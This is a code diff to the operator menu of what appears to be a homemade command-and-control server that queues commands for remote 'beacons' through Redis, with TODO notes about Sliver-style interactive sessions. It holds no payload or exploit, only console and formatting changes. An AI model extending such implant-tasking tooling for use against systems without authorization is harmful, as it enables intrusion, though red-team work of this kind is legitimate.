@@ -15,7 +15,20 @@ def searchUUID(uuid):
     print(conn.hget('UUID', uuid))
 
 while True:
-    inp = input('(1)Enter command / (2)Search by UUID / (3)Clear DB / (4)Start a listener / (5)List all')
+    # We should change this to a help dialogue
+    # If command is empty, display the help dialogue
+    # Add a GetLastCommand command
+    # Add an interact option so that you enter a session with a beacon
+    # Sort of akin to Sliver
+    # Add an await option. After a command, await the redis update, then display
+    # Set command and then await for a new var to be set
+    # We will set the retrieved value when it fetches a new command
+    # If retrieved is 0, then don't display. If it's 1, display the result and then reset to 0
+    inp = input('(1)Enter command / '
+                '(2)Search by UUID / '
+                '(3)Clear DB / '
+                '(4)Start a listener / '
+                '(5)List all')
     if inp == '1':
         uuid = input('UUID: ')
         comm = input('Command: ')
@@ -28,14 +41,17 @@ while True:
         lci = json.loads(structure)  # Load it into a new var
         LastCheckIn = lci["LastCheckIn"]  # Grab the command var from the object
         structure = {
+            "Retrieved:": "0",
             "Command": f"{comm}",
             "LastInteraction": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
-            "LastCheckIn":f"{LastCheckIn}",
+            "LastCheckIn": f"{LastCheckIn}",
             "Result": "0"
         }
         structure = json.dumps(structure)  # Dump the json
         # Write the message value to the beacon:UUID key
         conn.hset('UUID', uuid, structure)
+
+
     elif inp == '2':
         uuid = input('UUID: ')
         searchUUID(uuid)
